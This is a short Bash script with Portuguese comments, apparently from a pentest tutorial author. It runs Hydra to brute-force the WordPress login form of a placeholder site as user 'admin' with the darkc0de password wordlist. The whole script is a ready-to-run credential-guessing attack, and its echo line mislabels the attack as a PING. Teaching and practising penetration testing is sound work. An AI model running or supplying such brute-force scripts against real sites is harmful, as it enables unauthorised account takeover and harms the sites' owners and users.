#!/bin/bash
# Autor: Robson Vaamonde
# Site: www.procedimentosemti.com.br
# Facebook: facebook.com/ProcedimentosEmTI
# Facebook: facebook.com/BoraParaPratica
# YouTube: youtube.com/BoraParaPratica
# Data de criação: 31/10/2016
# Data de atualização: 31/10/2016
# Versão: 1.0

#Variável do comando Hydra
ALVO="www.SEU_ALVO.br"
USERNAME="admin"
WORDLIST="darkc0de.lst"

#Executando o comando Hydra com a opções: -vV=Modo Verboso, detalhado na hora de passar usuário e senhas, -l=Usuário, -P=Wordlist de senhas, http-post-from=Envio de formulário para adicionar o usuário e senhas
#Informações para o http-post-form foi levantada utilizando o comando Curl
echo -e "Executando o comando PING no alvo: $ALVO"
echo
  hydra -vV $ALVO -l $USERNAME -P $WORDLIST http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^:Bad Loggin"
echo
echo -e "Fim da execução `date`"
